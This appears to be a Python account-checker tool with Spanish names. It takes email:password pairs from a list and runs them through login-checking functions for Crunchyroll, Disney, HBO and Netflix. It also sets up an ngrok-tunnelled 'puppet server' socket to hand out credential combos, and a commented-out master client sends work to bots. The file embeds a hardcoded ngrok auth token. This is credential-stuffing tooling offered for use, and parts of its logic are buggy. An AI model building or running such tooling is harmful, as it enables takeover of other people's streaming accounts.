import socket
import threading
from pyngrok import ngrok
import ConfigStrem as St

def IniciarHilo(data,Co,Cs):
    # Verificar si el hilo ya está en ejecución
    is_running = False
    if not is_running:
        # Crear un hilo para ejecutar el bucle en segundo plano
        log_thread = threading.Thread(target=PlataformasStriming(data,Co,Cs))
        # Establecer la bandera como verdadera para indicar que el hilo está en ejecución
        is_running = True
        # Iniciar el hilo
        log_thread.start()

def PlataformasStriming(data,Co,Cs):
    CadenaUsuarios = St.GenCorreo('base.txt')
    streming = data
    
    # while True:
    try:

        # Co, Cs = next(CadenaUsuarios)

        if streming == 'Crunchyroll':
            msg = St.Crunchyroll(Co, Cs)
            print(msg)
            # Reflejo(msg)

        elif streming == 'Disney':
            msg = St.Disney(Co, Cs)
            print(msg)
            # Reflejo(msg)
        
        elif streming == 'Hbo':
            msg = St.Hbo(Co, Cs)
            print(msg)
            # Reflejo(msg)
        
        elif streming == 'Netflix':
            msg = St.Netflix(Co, Cs)
            print(msg)
            # Reflejo(msg)

    except Exception:
        pass

def ServidorTitere():                                  

    PUERTO = 9090
    ngrok.set_auth_token("1nwcV7atojVGXfYqOyKfMaCDHfQ_6hrzGHH9DBQ2yZeVYEZAf")
    IpNgrok = ngrok.connect(PUERTO).public_url

    HOST = IpNgrok
    PORT = 65432

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()

        print('Connected by', addr)
        
        while True:
            try:
                data = conn.recv(1024)
                msg = data.decode()

                try:
                    pt,Co,Cs = msg.split(':')

                    # print(pt,Co,Cs)
                    # obj = start_log_thread(pt,Co,Cs)
                    # conn.sendall(obj.encode())

                    if msg == 'End':
                        break

                    conn.sendall(msg)

                except ValueError:
                    print('[+] Finalizo la lista de usuarios y contrasenas')
                    break

            except Exception as _:
                # print(f'[-] error en {_}')
                # break
                pass

PUERTO = 9090
ngrok.set_auth_token("1nwcV7atojVGXfYqOyKfMaCDHfQ_6hrzGHH9DBQ2yZeVYEZAf")
url_publica = ngrok.connect(PUERTO,"tcp").public_url
print(url_publica)


# print('✔️  Tarea 1 completa')
# def CienteMastro(ip):

#     HOST = ip #bots.get()
#     PORT = 65432        

#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.connect((HOST, PORT))

#         while True:
#             msg = '' #strem.get()
            
#             s.sendall(msg.encode())
            
#             data = s.recv(1024)
            
#             #reflejo(msg)

#             if msg == "chao":
#                break    
#     print('Recibido', repr(data)) 